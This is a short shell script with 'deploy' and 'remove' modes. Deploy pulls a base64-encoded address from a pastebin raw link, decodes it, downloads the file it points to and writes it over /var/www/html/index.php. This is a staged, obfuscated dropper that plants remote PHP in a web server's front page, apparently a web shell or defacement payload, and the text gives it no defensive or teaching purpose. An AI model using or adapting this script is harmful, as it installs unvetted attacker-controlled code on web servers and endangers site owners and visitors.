#!/bin/sh

set -x

BASE64=""
BASE64_OPTS="-d"
CURL=""
CURL_OPTS="-s"
OUTPUT_PATH="/var/www/html"
OUTPUT_NAME="index.php"
OUTPUT=$OUTPUT_PATH/$OUTPUT_NAME
PAYLOAD_URL="https://pastebin.com/raw/rcUH9Qq9"

check_base64(){
	BASE64=$(which base64)
	if [ $? -eq 0 ]; then
		return 0
	else
		echo $BASE64 && exit 1
	fi
}

check_curl(){
	CURL=$(which curl)
	if [ $? -eq 0 ]; then
		return 0
	else
		echo $CURL && exit 1
	fi
}

check_download_path(){
	if [ -d $OUTPUT_PATH ]; then
		return 0
	else
		mkdir -p $OUTPUT_PATH || exit 1
	fi
}

cleanup(){
	if [ -f $OUTPUT ]; then
		rm -f $OUTPUT
		return 0
	else
		exit 1
	fi
}

download_payload(){
	$CURL $CURL_OPTS $($CURL $CURL_OPTS $PAYLOAD_URL | $BASE64 $BASE64_OPTS) -o $OUTPUT || exit 1
}

case "$1" in
  deploy)
    check_base64
	check_curl
	check_download_path
	download_payload
  ;;
  remove)
    cleanup
  ;;
  *)
    echo "Usage: $0 {deploy|remove}" >&2
    exit 1
  ;;
esac
